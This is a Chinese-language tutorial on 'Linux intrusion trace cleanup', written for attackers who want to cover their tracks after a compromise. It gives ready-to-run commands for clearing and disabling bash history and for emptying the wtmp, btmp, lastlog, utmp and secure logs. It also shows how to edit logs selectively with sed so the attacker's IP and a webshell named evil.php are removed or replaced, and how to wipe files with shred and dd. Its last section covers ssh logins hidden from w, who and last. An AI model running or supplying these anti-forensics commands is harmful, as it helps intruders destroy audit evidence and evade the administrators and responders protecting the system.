# Linux入侵痕迹清理

### 清除history历史命令记录

**方式一：**

1. 编辑history记录文件，删除部分不想被保存的历史命令

```bash
vim ~/.bash_history
```

2. 清除当前用户的history命令记录

```bash
history -c
```

3. 清除当前会话的命令记录

```bash
:set history=0
:!command
```

**方式二**

1. 利用vim特性删除历史命令

```bash
#使用vim打开一个文件
vi test
#设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中
:set history=0
#用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令
vsp ~/.bash_history
# 清除保存.bash_history文件即可
```

2. 在vim中执行自己不想让别人看到的命令

```bash
:set history=0
:!command
```

**方式三**

1. 修改配置文件/etc/profile，使系统不再保存命令记录

```bash
HISTSIZE=0
```

**方式四**

1. 登录后执行bash命令，不记录历史命令

```bash
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
```



### 清除系统日志痕迹

Linux系统日志文件

```bash
/var/log/btmp   记录所有登录失败信息，使用lastb命令查看
/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看
/var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看
/var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看
/var/log/secure   记录与安全相关的日志信息
/var/log/message  记录系统启动后的信息和错误日志
```

**方式一：**清空日志文件

清除登录系统失败的记录

```bash
#将btmp文件覆盖为空
echo > /var/log/btmp

#再次查询
lastb
```

清除登录系统成功的记录

```bash
#将wtmp文件覆盖为空
echo > /var/log/wtmp

#再次查询
last
```

清除相关日志信息

```bash
#清除用户最后一次登录时间
echo > /var/log/lastlog
#清除当前登录用户的信息
echo > /var/log/utmp
#清除安全日志记录
cat /dev/null > /var/log/secure
#清除系统日志记录
cat /dev/null > /var/log/message
```

**方式二：**删除/替换部分日志

方式一将日志文件全部清空，管理员一看就知道被入侵过了，不太友好，如果只删除或替换部分关键日志信息，就可以完美隐藏攻击痕迹

```bash
# 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip
sed  -i '/自己的ip/'d  /var/log/messages

# 全局替换登录IP地址：
sed -i 's/192.168.166.85/192.168.1.1/g' secure
```



### 清除web入侵痕迹

**方式一：**直接替换日志ip地址

```bash
sed -i 's/192.168.166.85/192.168.1.1/g' access.log
```

**方式二：**清除部分相关日志

```bash
# 使用grep -v来把我们的相关信息删除,
cat /var/log/nginx/access.log | grep -v evil.php > tmp.log

# 把修改过的日志覆盖到原日志文件
cat tmp.log > /var/log/nginx/access.log/
```



### 文件安全删除工具

1. **shred命令**

```bash
#实现安全的从硬盘上擦除数据集，默认覆盖3次，-n参数指定次数
shred -f -u -z -v -n 8 1.txt
```

2. **dd命令**

```bash
#安全地清除硬盘或分区的内容
dd if=/dev/zero of=要删除的文件 bs=大小 count=写入的次数
```

3. **wipe**

```bash
#wipe使用特殊的模式来重复地写文件，从磁性介质中安全擦除文件
wipe filename
```



### 隐藏远程ssh登录记录

隐身ssh连接登录系统，不会被w、who、last等指令检测到

```bash
ssh -T root@host /bin/bash -i
```

不记录ssh公钥在本地.ssh目录中

```bash
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
```